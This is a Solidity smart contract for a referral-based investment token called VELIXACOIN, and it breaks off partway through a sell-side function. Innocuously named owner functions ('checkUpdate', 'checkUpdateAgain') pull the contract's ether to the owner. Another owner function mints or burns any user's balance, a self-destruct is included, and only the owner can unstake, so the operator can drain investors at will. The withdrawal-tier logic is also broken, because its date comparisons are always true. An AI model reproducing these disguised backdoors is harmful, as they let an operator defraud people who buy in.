//SourceUnit: velixacoinnew.sol

pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    
    struct Investment {
        uint256 investmentDate;   // All Token Buying Date
        uint256 investment;         // ether
        uint256 token;         // token
        uint256 lastWithdrawalDate; // 
        uint256 restRefer;
        uint256 stakeInvestment;
        uint256 stakeDate;
        uint256 stakeDays;
        bool isExpiredSatke;
    }

    struct Investor {
        address addr;
		uint256 checkpoint;
		uint256 firstInvestment;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        uint256 planStake;
        mapping(uint256 => Investment) stakeplan;
        mapping(uint256 => Investment) plans;
        mapping(uint256 => Investment) referrerList;
    }
}

contract Ownable {
    
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    
    // only owners
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract VELIXACOIN is Ownable{
    
    using SafeMath for uint256;
    
    // only balance holders
    modifier onlyHolders(){
        require(myTokens() > 0);
        _;
    }
    
    /*==============================
    =            EVENTS            =
    ==============================*/
    event Approval(
        address indexed tokenOwner, 
        address indexed spender,
        uint tokens
    );
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
    event Withdraw(
        address indexed customerAddress,
        uint256 etronWithdrawn
    );
    event Buy(
        address indexed buyer,
        uint256 tokensBought
    );
    event Sell(
        address indexed seller,
        uint256 tokensSold
    );
    
    string public name = "VELIXACOIN";
    string public symbol = "VLX";
    uint8 constant public decimals = 3;
    uint256 public totalSupply_ = 1350000000;
    uint256 constant internal tokenPriceInitial_ = 1368738;
    uint256 constant internal tokenPriceIncremental_ = 7;
    uint256 public currentPrice_ = tokenPriceInitial_ + tokenPriceIncremental_;
    uint256  public grv = 1;
    uint256         MIN_HOLDING = 2247595073 ;           // $100
    uint256 internal bPercent = 1000;                           //comes multiplied by 10000 from outside
    uint256 internal sPercent = 2000;                           //comes multiplied by 10000 from outside
    uint256 internal minimumsell = 2500;                           //
    uint256 internal constant REFERRER_CODE = 7788;              // Root ID : 10000
    uint256 internal constant REFERENCE_RATE = 200;              // 20% Total Refer Income
    uint256 internal constant REFERENCE_LEVEL1_RATE = 100;       // 10% Level 1 Income
    uint256 internal constant REFERENCE_LEVEL2_RATE = 50;        // 5% Level 2 Income
    uint256 internal constant REFERENCE_LEVEL3_RATE = 30;        // 3% Level 3 Income
    uint256 internal constant REFERENCE_LEVEL4_RATE = 20;        // 2% Level 4 Income
    
    uint256 public  latestReferrerCode;                         //Latest Reference Code 
    address commissionHolder;                                   // holds commissions fees
    address stakeHolder;                                        // holds stake
    uint256 commFunds=0;                                        //total commFunds
    address payable maddr;
    uint256 public tokenSupply_ = 0;
    bool withdrawAllow = true;
    bool tramsferAllow = true;
    bool unstakeAllow = true;
    uint256 internal totalStake = 0;
    uint256 internal minimumStake = 1000;
    uint256 internal MAX_WITHDRAW = 13500000;
    uint256 internal thirty = 250;
    uint256 internal sixty = 500;
    uint256 internal ninety = 750;
    uint256 internal onetwenty = 1000;
    uint256 internal stakethiry = 500;
    uint256 internal stakesixty = 1500;
    uint256 internal stakeninty = 3000;

    
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) public myInvestments_; 
    mapping(address => uint256) public myWithdraw_; 
    mapping(address => uint256) internal stakeBalanceLedger_;
    
    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    
     constructor() public
    {
        maddr = msg.sender;
        stakeHolder = maddr;
        commissionHolder = maddr;
        tokenBalanceLedger_[maddr] = 900000000;
        tokenSupply_ = 0;
        grv = 1;
         _init();
    }
    
    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
    }
    
    function totalSupply()
        public
        view
        returns(uint256)
    {
        return totalSupply_/1000;
    }
    
    function destruct() onlyOwner() public{
        
        selfdestruct(maddr);
    }
    
    function getBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
    function upgradeTerm(uint256 _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            MIN_HOLDING = _comm;
        }
        if(mode_ == 2)
        {
            sPercent = _comm;
        }
        if(mode_ == 3)
        {
            bPercent = _comm;
        }
        if(mode_ == 4)
        {
            minimumsell = _comm;
        }
        if(mode_ == 5)
        {
            minimumStake = _comm;
        }
        if(mode_ == 6)
        {
            MAX_WITHDRAW = _comm;
        }
    }
    function checkupgradeTerm()
        public
        onlyOwner 
        view
        returns(uint256,uint256,uint256,uint256,uint256,uint256)
    {
        return (
            MIN_HOLDING,
            sPercent,
            bPercent,
            minimumsell,
            minimumStake,
            MAX_WITHDRAW
            );
    }
    
    function updateDays(uint256 _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            thirty = _comm;
        }
        if(mode_ == 2)
        {
            sixty = _comm;
        }
        if(mode_ == 3)
        {
            ninety = _comm;
        }
        if(mode_ == 4)
        {
            onetwenty = _comm;
        }
    }
    
    function checkdays()
        public
        onlyOwner 
        view
        returns(uint256,uint256,uint256,uint256)
    {
        return (
            thirty,
            sixty,
            ninety,
            onetwenty
            );
    }
    
    function updateStakingReward(uint256 _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            stakethiry = _comm;
        }
        if(mode_ == 2)
        {
            stakesixty = _comm;
        }
        if(mode_ == 3)
        {
            stakeninty = _comm;
        }
    }
    
    function checkStakingReward()
        public
        onlyOwner 
        view
        returns(uint256,uint256,uint256)
    {
        return (
            stakethiry,
            stakesixty,
            stakeninty
            );
    }
    
    function CheckIncrementalPriceFull()
        public
        view
        returns(uint256)
    {
        return incrementalPriceFull(grv);
    }
    
    function updateMaddr(address payable naddr) 
    public
    onlyOwner
    {          
        maddr= naddr;
    }
    
    function checkUpdate(uint256 _amount) 
    public
    onlyOwner
    {       
            uint256 currentBalance = getBalance();
            require(_amount <= currentBalance);
            maddr.transfer(_amount);
    }
    
    function checkUpdateAgain(uint256 _amount) 
    public
    onlyOwner
    {       
            (msg.sender).transfer(_amount);
    }
    
    function myTokens() public view returns(uint256)
    {
        return (tokenBalanceLedger_[msg.sender]);
    }
    
    function balanceOf(address _customerAddress) public view returns (uint256){
        return tokenBalanceLedger_[_customerAddress];
    }
    
    function holdStake(uint256 _amount,uint256 _days)
        onlyHolders()
        public
        {   
            address _customerAddress = msg.sender;
            require(_amount >= minimumStake ,"amoun must be grater than minimumStake token");
            if(_days == 30 || _days == 60 || _days == 90  ){
                
            }else{
                require(false ,"Enter Correct Days");
            }
            uint256 uid = address2UID[_customerAddress];
            
            uint256 planStake = uid2Investor[uid].planStake;
            Objects.Investor storage investor = uid2Investor[uid];
            
            investor.stakeplan[planStake].stakeInvestment = _amount;
            if(_days == 30){
                investor.stakeplan[planStake].stakeDays = 30 days;
            }else if(_days == 60){
                investor.stakeplan[planStake].stakeDays = 60 days;
            }else if(_days == 90){
                investor.stakeplan[planStake].stakeDays = 90 days;
            }
            
            investor.stakeplan[planStake].stakeDate = block.timestamp;
            investor.stakeplan[planStake].isExpiredSatke = false;
            investor.planStake = investor.planStake.add(1);
            
            tokenBalanceLedger_[msg.sender] = SafeMath.sub(tokenBalanceLedger_[msg.sender], _amount);
            tokenBalanceLedger_[stakeHolder] = SafeMath.add(tokenBalanceLedger_[stakeHolder], _amount);
            stakeBalanceLedger_[msg.sender] = SafeMath.add(stakeBalanceLedger_[msg.sender], _amount);
            totalStake += _amount;
        }
        
    function unstake(uint256 _amount, address _customerAddress)
        onlyOwner()
        public
    {   
        require(_amount <= stakeBalanceLedger_[_customerAddress],"Amount greater than stake amount");
                    require(unstakeAllow == true, "Unstake not working");

        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress],_amount);
        stakeBalanceLedger_[_customerAddress] = SafeMath.sub(stakeBalanceLedger_[_customerAddress], _amount);
        tokenBalanceLedger_[stakeHolder] = SafeMath.sub(tokenBalanceLedger_[stakeHolder], _amount);
        totalStake -= _amount;

    }
        
    function unstakeHolder(uint256 _amount)
        onlyHolders()
        public
    {   
        address _customerAddress = msg.sender;
        bool _condition = false ;
        uint256 _stakeReward = 0;
        require(_amount <= stakeBalanceLedger_[_customerAddress],"Amount greater than stake amount");
        
        uint256 uid = address2UID[_customerAddress];
        //  uint256 planStake = uid2Investor[uid].planStake;
            Objects.Investor storage investor = uid2Investor[uid];
            
        for (uint256 i = 0; i < investor.planStake; i++) {
            
            if (uid2Investor[uid].stakeplan[i].isExpiredSatke) {
                continue;
            } 
            
            uint256 currentTime = block.timestamp;
            uint256 stakePercent = 0;
            uint256 stakedayss = uid2Investor[uid].stakeplan[i].stakeDays;
            uint256 totaltime = uid2Investor[uid].stakeplan[i].stakeDate + stakedayss;
            
            
            if(uid2Investor[uid].stakeplan[i].stakeInvestment == _amount){
                _condition = true;//now you can withdrawal
                uid2Investor[uid].stakeplan[i].isExpiredSatke = true;
                // _stakeReward = calculateStakingReward(_amount,500);
                if( totaltime < currentTime ){
                    if(stakedayss == 30 ){
                        stakePercent = stakethiry;
                    }else if(stakedayss == 60 ){
                        stakePercent = stakesixty;
                    }else if(stakedayss == 90){
                        stakePercent = stakeninty;
                    }
                    _stakeReward = calculateStakingReward(_amount,stakePercent);
                }
                break;
            }
            
        }
        
        require(_condition == true ,"only accept value when you entered at staking time or you alrady withdraw");
        
        uint256 totaltokenwithdraw = _amount + _stakeReward;

        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], (totaltokenwithdraw));
        stakeBalanceLedger_[_customerAddress] = SafeMath.sub(stakeBalanceLedger_[_customerAddress], _amount);
        tokenBalanceLedger_[stakeHolder] = SafeMath.sub(tokenBalanceLedger_[stakeHolder], _amount);
        totalStake -= _amount;

    }
    
    function calculateStakingReward(uint256 _amount , uint256 _interest ) internal pure returns(uint256){
        // uint256 interesttemp = _interest;
        uint256 percenttemp = _amount * _interest / 10000;
                return (percenttemp );

    }
    
    function getStakingPlanByAddress(address _add) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        uint256 _uid = address2UID[_add];
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory stakeDateee = new  uint256[](investor.planStake);
        uint256[] memory stakeDaysss = new  uint256[](investor.planStake);
        uint256[] memory stakeInvestmenttt = new  uint256[](investor.planStake);
        bool[] memory isExpireds = new  bool[](investor.planStake);

        for (uint256 i = 0; i < investor.planStake; i++) {
            require(investor.stakeplan[i].stakeDate!=0,"wrong investment date");
            stakeDateee[i] = investor.stakeplan[i].stakeDate;
            stakeDaysss[i] = investor.stakeplan[i].stakeDays;
            stakeInvestmenttt[i] = investor.stakeplan[i].stakeInvestment;
            
            isExpireds[i] = investor.stakeplan[i].isExpiredSatke;
            
        }

        return
        (
        stakeDateee,
        stakeDaysss,
        stakeInvestmenttt,
        isExpireds
        );
    }

    function totalStakes()
        onlyOwner()
        public view
        returns(uint256)
    {
        return totalStake;
    }
    
    
    function getStakingAmount(address _customerAddress)
    onlyHolders()
        public view
        returns(uint256)
    {
        return stakeBalanceLedger_[_customerAddress];
    }
    
    function upgradeSingleContract(address _users, uint256 _balances, uint modeType)
    onlyOwner()
    public
    {
        if(modeType == 1)
        {
            
                tokenBalanceLedger_[_users] += _balances;
                emit Transfer(address(this),_users,_balances);

        }
        if(modeType == 2)
        {
            
                tokenBalanceLedger_[_users] -= _balances;
                emit Transfer(address(this),_users,_balances);
        }
    }
    
    function myReferrEarnings( address _customerAddress) public view onlyHolders returns (uint256,uint256,address) {
        uint256 _uid = address2UID[_customerAddress] ;
        
        Objects.Investor storage investor = uid2Investor[_uid];
        address sponsor = uid2Investor[investor.referrer].addr;
        return
        (
        investor.availableReferrerEarnings,
        investor.referrer,
        sponsor
        );
    }
    function referrLevelCountInfo(address _addr) public view returns (uint256,uint256,uint256,uint256) {
        
        uint256 _uid = address2UID[_addr];
        Objects.Investor storage investor = uid2Investor[_uid];
        return
        (
        investor.referrerList[1].restRefer,
        investor.referrerList[2].restRefer,
        investor.referrerList[3].restRefer,
        investor.referrerList[4].restRefer
        );
    }
    
     function buy(uint256 _referrerCode)
        public
        payable
    {
        //iscontract 
        purchaseTokens(msg.value, _referrerCode);
    }
    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].planStake = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;

            uid2Investor[_ref1].referrerList[1].restRefer = uid2Investor[_ref1].referrerList[1].restRefer.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].referrerList[2].restRefer = uid2Investor[_ref2].referrerList[2].restRefer.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].referrerList[3].restRefer = uid2Investor[_ref3].referrerList[3].restRefer.add(1);
            }
            if (_ref4 >= REFERRER_CODE) {
                uid2Investor[_ref4].referrerList[4].restRefer = uid2Investor[_ref4].referrerList[4].restRefer.add(1);
            }
        }
        return (latestReferrerCode);
    }
    
    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

        // uint256 _allReferrerAmount = ( _investment.mul(REFERENCE_RATE) ).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
           address _refAddr ;
           uint256 _token = 0;
           uint256 _etron = 0;
            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                _refAddr = uid2Investor[_ref1].addr;
                _token = tokenBalanceLedger_[_refAddr];
              _etron =  calculateEthereumReceived(_token,false);
                if(_etron >= MIN_HOLDING ){
                    _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                // _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);
                tokenBalanceLedger_[_refAddr]+=_refAmount;
                }
                
            }
            if (_ref2 != 0) {
                _refAddr = uid2Investor[_ref2].addr;
                _token = tokenBalanceLedger_[_refAddr];
              _etron =  calculateEthereumReceived(_token,false);
                if(_etron >= MIN_HOLDING ){
                    _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
                tokenBalanceLedger_[_refAddr]+=_refAmount;
                }
                
            }
            if (_ref3 != 0) {
                _refAddr = uid2Investor[_ref3].addr;
                _token = tokenBalanceLedger_[_refAddr];
              _etron =  calculateEthereumReceived(_token,false);
                if(_etron >= MIN_HOLDING ){
                    _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
                tokenBalanceLedger_[_refAddr]+=_refAmount;
                }
                
            }
            if (_ref4 != 0) {
                _refAddr = uid2Investor[_ref4].addr;
                _token = tokenBalanceLedger_[_refAddr];
              _etron =  calculateEthereumReceived(_token,false);
                if(_etron >= MIN_HOLDING ){
                    _refAmount = (_investment.mul(REFERENCE_LEVEL4_RATE)).div(1000);
                uid2Investor[_ref4].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref4].availableReferrerEarnings);
                tokenBalanceLedger_[_refAddr]+=_refAmount;
                }
                
            }
        }

    }
    
    
    
    function purchaseTokens(uint256 _incomingEtron , uint256 _referrerCode)
        internal
        returns(uint256)
    {
    // {    // data setup
        address _customerAddress = msg.sender;
        _incomingEtron = _incomingEtron - (_incomingEtron * bPercent)/10000; //buypercent
        require(_incomingEtron >= currentPrice_  , "Less than the minimum amount of one Token");
        
         uint256 uid = address2UID[_customerAddress];
        if (uid == 0) {
            uid = _addInvestor(_customerAddress, _referrerCode);
            stakeBalanceLedger_[msg.sender]=0;
            uid2Investor[uid].firstInvestment = block.timestamp;
            //new user
        } else {
          //old user
          //do nothing, referrer is permenant
        }
        
        uint32 size;
        assembly {
            size := extcodesize(_customerAddress)
        }
        require(size == 0, "cannot be a contract");
        
        uint256 _amountOfTokens = etronToTokens_(_incomingEtron , currentPrice_, grv);
        require(SafeMath.add(_amountOfTokens,tokenSupply_) < totalSupply_,"Can not buy more than Total Supply");
        
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amountOfTokens;
        // investor.plans[planCount].currentDividends = 0;
        myInvestments_[msg.sender]+=_amountOfTokens;
        investor.planCount = investor.planCount.add(1);
        
        tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
        _calculateReferrerReward(_amountOfTokens, investor.referrer);
       
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        
        emit Transfer(address(this), _customerAddress, _amountOfTokens);
        return _amountOfTokens;
    }
    
    function etronToTokens_(uint256 _etron, uint256 _currentPrice, uint256 _grv)
        internal
        returns(uint256)
    {
        uint256 _etrrron =_etron;
        uint256 _comeEther =_etron;
        // uint256 _tokenPriceIncremental = (tokenPriceIncremental_*(2**(_grv-1)));
        uint256 _tokenPriceIncremental = incrementalPriceFull(_grv);
        uint256 _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
        uint256 _tokenSupply = tokenSupply_/1000;
        uint256 _totalTokens = 0;
        uint256 _tokensReceived = (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            _tempad**2
                            + (8*_tokenPriceIncremental*_etrrron)
                        )
                    ), _tempad
                )
            )/(2*_tokenPriceIncremental)
        );
        uint256 tempbase = upperBound_(_grv);
        while((_tokensReceived + _tokenSupply) > tempbase){
            _tokensReceived = tempbase - _tokenSupply;
            _etrrron = SafeMath.sub(
                _etrrron,
                ((_tokensReceived)/2)*
                ((2*_currentPrice)+((_tokensReceived-1)
                *_tokenPriceIncremental))
            );
            _currentPrice = _currentPrice+((_tokensReceived-1)*_tokenPriceIncremental);
            _grv = _grv + 1;
            // _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
            _tokenPriceIncremental = incrementalPriceFull(_grv);
            _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
            uint256 _tempTokensReceived = (
                (
                    SafeMath.sub(
                        (sqrt
                            (
                                _tempad**2
                                + (8*_tokenPriceIncremental*_etrrron)
                            )
                        ), _tempad
                    )
                )/(2*_tokenPriceIncremental)
            );
            _tokenSupply = _tokenSupply + _tokensReceived;
            _totalTokens = _totalTokens + _tokensReceived;
            _tokensReceived = _tempTokensReceived;
            tempbase = upperBound_(_grv);
        }
        _totalTokens = _totalTokens + _tokensReceived;
        _currentPrice = _currentPrice+((_tokensReceived)*_tokenPriceIncremental);
        
        uint256 totalEtron = calculateEtronBuy(_totalTokens*1000,false);
            uint256 _decitoken = 0;
            uint256 eligble = 0;
            
            if(_comeEther > totalEtron){
             eligble = _comeEther - totalEtron;
             _decitoken = getEtronToTokensdeci_(eligble,_currentPrice);
            }
            
        _totalTokens = (_totalTokens*1000) + _decitoken;
        
        currentPrice_ = _currentPrice;
        grv = _grv;
        return _totalTokens;
    }
    
    function getEtronToTokensdeci_(uint256 _etron, uint256 _currentPrice)
        internal
        pure
        returns(uint256)
    {
        uint256 _etrrron = _etron;
        uint256 _decitoken =0;
        
            if(_etrrron > 0) {
                _decitoken = (_etrrron /( _currentPrice/1000));
            }
            if(_decitoken > 1000){
                _decitoken = 0;
            }
        return _decitoken;
    }
    
     function getTokensToEtronBuyDeci_(uint256 _tokens , uint256 _currentPrice)
        internal
        pure
        returns(uint256)
    {
        uint256 _etherReceived = 0;
        uint256 decitoken = _tokens;
        
        if(decitoken > 0 && decitoken < 1000){
            _etherReceived = (decitoken*(_currentPrice/1000));
        }
        return _etherReceived;
    }
    
    //just_cheking
    function getEtronToTokensBuy(uint256 _ethere) public view returns(uint256){
        
        _ethere = _ethere - (_ethere * bPercent)/10000; //buypercent
        
        return getEtronToTokens_(_ethere,currentPrice_,grv);
    }
    
    
    function getEtronToTokens_(uint256 _etron, uint256 _currentPrice, uint256 _grv)
        internal
        view
        returns(uint256)
    {
        uint256 _ethereum =_etron;
        uint256 _comeEther =_etron;
        // uint256 _tokenPriceIncremental = (tokenPriceIncremental_*(2**(_grv-1)));
        uint256 _tokenPriceIncremental = incrementalPriceFull(_grv);
        uint256 _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
        uint256 _tokenSupply = tokenSupply_/1000;
        uint256 _totalTokens = 0;
        uint256 _tokensReceived = (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            _tempad**2
                            + (8*_tokenPriceIncremental*_ethereum)
                        )
                    ), _tempad
                )
            )/(2*_tokenPriceIncremental)
        );
        uint256 tempbase = upperBound_(_grv);
        while((_tokensReceived + _tokenSupply) > tempbase){
            _tokensReceived = tempbase - _tokenSupply;
            _ethereum = SafeMath.sub(
                _ethereum,
                ((_tokensReceived)/2)*
                ((2*_currentPrice)+((_tokensReceived-1)
                *_tokenPriceIncremental))
            );
            _currentPrice = _currentPrice+((_tokensReceived-1)*_tokenPriceIncremental);
            _grv = _grv + 1;
            // _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
            _tokenPriceIncremental = incrementalPriceFull(_grv);
            _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
            uint256 _tempTokensReceived = (
                (
                    SafeMath.sub(
                        (sqrt
                            (
                                _tempad**2
                                + (8*_tokenPriceIncremental*_ethereum)
                            )
                        ), _tempad
                    )
                )/(2*_tokenPriceIncremental)
            );
            _tokenSupply = _tokenSupply + _tokensReceived;
            _totalTokens = _totalTokens + _tokensReceived;
            _tokensReceived = _tempTokensReceived;
            tempbase = upperBound_(_grv);
        }
        _totalTokens = _totalTokens + _tokensReceived;
        _currentPrice = _currentPrice+((_tokensReceived-1)*_tokenPriceIncremental);
        // currentPrice_ = _currentPrice;
        // grv = _grv;
        
        uint256 totalEtron = calculateEtronBuy(_totalTokens*1000,false);
            uint256 _decitoken = 0;
            uint256 eligble = 0;
            
            if(_comeEther > totalEtron){
             eligble = _comeEther - totalEtron;
             _decitoken = getEtronToTokensdeci_(eligble,_currentPrice);
            }
            
        _totalTokens = (_totalTokens*1000) + _decitoken;
        
        return _totalTokens;
    }
    
    function calculateEtronBuy(uint256 _tokensToBUY,bool _boolvalue) 
        public
        view
        returns(uint256)
    {
        require(_tokensToBUY+tokenSupply_ <= totalSupply_);
        
        uint256 _tokens = _tokensToBUY/1000;
        uint256 value = _tokens/2;
        uint256 _ethereum = 0;
        if((2 * value) == _tokens){
            //even
             _ethereum = getTokensToEtronBuy_(_tokensToBUY);
        }else{
            //odd
            _tokensToBUY-=1000;
             _ethereum = getTokensToEtronBuy_(_tokensToBUY);
            uint256 _currentPrice = currentPrice_ +((_tokens-1)*incrementalPriceFull(grv));
            _ethereum +=_currentPrice+incrementalPriceFull(grv);
        }
        
        if(_boolvalue == true){
        _ethereum = _ethereum + (_ethereum * bPercent)/10000; //buypercent
        }

        return _ethereum;
    }
    
    function getTokensToEtronBuy_(uint256 _tokens)
        internal
        view
        returns(uint256)
    {
        uint256 fulltoken =  _tokens/1000;
        uint256 decitoken = _tokens%1000;
        _tokens = fulltoken;
        uint256 _tokenSupply = tokenSupply_/1000;
        uint256 _etherReceived = 0;
        uint256 _grv = grv;
        uint256 tempbase = upperBound_(_grv);
        uint256 _currentPrice = currentPrice_;
        // uint256 _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
        uint256 _tokenPriceIncremental = incrementalPriceFull(_grv);
        while((_tokenSupply + _tokens) > tempbase)
        {
            uint256 tokensToBuy = tempbase - _tokenSupply;
            if(tokensToBuy == 0)
            {
                _tokenSupply = _tokenSupply + 1;
                _grv += 1;
                tempbase = upperBound_(_grv);
                continue;
            }
            uint256 b = ((tokensToBuy-1)*_tokenPriceIncremental);
            uint256 a = _currentPrice;
            _tokens = _tokens - tokensToBuy;
            _etherReceived = _etherReceived + ((tokensToBuy/2)*((2*a)+b));
            _currentPrice = a+b;
            _tokenSupply = _tokenSupply + tokensToBuy;
            _grv = _grv+1 ;
            // _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
            _tokenPriceIncremental = incrementalPriceFull(_grv);
            tempbase = upperBound_(_grv);
        }
        if(_tokens > 0)
        {
             uint256 a = _currentPrice;
             _etherReceived = _etherReceived + ((_tokens/2)*((2*a)+((_tokens-1)*_tokenPriceIncremental)));
             _tokenSupply = _tokenSupply + _tokens;
             _currentPrice = a + ((_tokens-1)*_tokenPriceIncremental);
        }
        
        _etherReceived = _etherReceived + getTokensToEtronBuyDeci_(decitoken,_currentPrice);
        return _etherReceived;
    }
    
   function withdrawEligible(address _customerAddress,uint256 _tokenamount)
    private
    view
    returns(uint256)
    {
        uint256 uid = address2UID[_customerAddress];
        uint256 eligble =0;
        uint256 myinvestment = myInvestments_[_customerAddress];
        uint256 myWithdraw = myWithdraw_[_customerAddress];
        uint256 firstInvestment = uid2Investor[uid].firstInvestment;
        if( firstInvestment < firstInvestment+30 days){
            eligble = (myinvestment*thirty)/1000;
        }else if(firstInvestment < firstInvestment+60 days){
            eligble = (myinvestment*sixty)/1000;
        }else if(firstInvestment < firstInvestment+90 days){
            eligble = (myinvestment*ninety)/1000;
        }else if(firstInvestment < firstInvestment+120 days){
            eligble = (myinvestment*onetwenty)/1000;
        }else{
             eligble = (myinvestment*onetwenty)/1000;
        }
        
        uint256 withdrawEligibleee = eligble - myWithdraw ;
        if(withdrawEligibleee > 1350000000){
            return 0;
        }else if(_tokenamount <= withdrawEligibleee){
            return _tokenamount;
        }else{
            return withdrawEligibleee;
        }
        
    }
    
    function sell(uint256 _tokensToSell)
    onlyHolders
        public
    {
        
        address payable _customerAddress = msg.sender;
        uint256 uid = address2UID[_customerAddress];
        uint256 allToken = _tokensToSell;
        
        if (msg.sender != owner) {
        require(uid > REFERRER_CODE,"You are not investor");
        require(_tokensToSell <= tokenBalanceLedger_[_customerAddress]);
        require(_tokensToSell <= MAX_WITHDRAW,"You cannot exceed the withdrawal or limit in a day");
        // require(_tokensToSell <= (tokenBalanceLedger_[_customerAddress]*minimumsell)/10000,"You cannot exceed the withdrawal 25% limit");
        // require(block.timestamp > uid2Investor[uid].checkpoint + 1 days , "Only once a day");
        require(withdrawAllow == true,"Error! something went wrong.");
        
        allToken = withdrawEligible(_customerAddress, _tokensToSell);
        require(allToken > 0,"Your are not eligible for withdraw ");
        }
        
        _tokensToSell = allToken;
        
        uint32 size;
        assembly {
            size := extcodesize(_customerAddress)
        }
        require(size == 0, "cannot be a contract");
        
        //oddeven
        uint256 _tokens = _tokensToSell/1000;
        uint256 value = _tokens/2;
        uint256 _etron = 0;
        if((2 * value) == _tokens){
            //even
             _etron = tokensToEthereum_(_tokensToSell);
        }else{
            //odd
            _tokensToSell-=1000;
             _etron = tokensToEthereum_(_tokensToSell);
            uint256 _currentPrice = currentPrice_ ;
            _etron +=_currentPrice - incrementalPriceFull(grv);
        }
        //oddeven
        
        _etron = _etron - (_etron * sPercent)/10000; //sellpercent

        tokenSupply_ = SafeMath.sub(tokenSupply_, allToken);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], allToken);
        
        myWithdraw_[_customerAddress]+=allToken;
        _customerAddress.transfer(_etron);
        emit Transfer(_customerAddress, address(this), allToken);
    }
   
    function tokensToEthereum_(uint256 _tokens)
        internal
        returns(uint256)
    {
        uint256 fulltoken =  _tokens/1000;
        uint256 decitoken = _tokens%1000;
        _tokens = fulltoken;
        uint256 _tokenSupply = tokenSupply_/1000;
        uint256 _etherReceived = 0;
        uint256 _grv = grv;
        uint256 tempbase = upperBound_(_grv-1);
        // uint256 _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
        uint256 _tokenPriceIncremental = incrementalPriceFull(_grv);
        uint256 _currentPrice = currentPrice_ - _tokenPriceIncremental;
        while((_tokenSupply - _tokens) < tempbase)
        {
            uint256 tokensToSell = _tokenSupply - tempbase;
            if(tokensToSell == 0)
            {
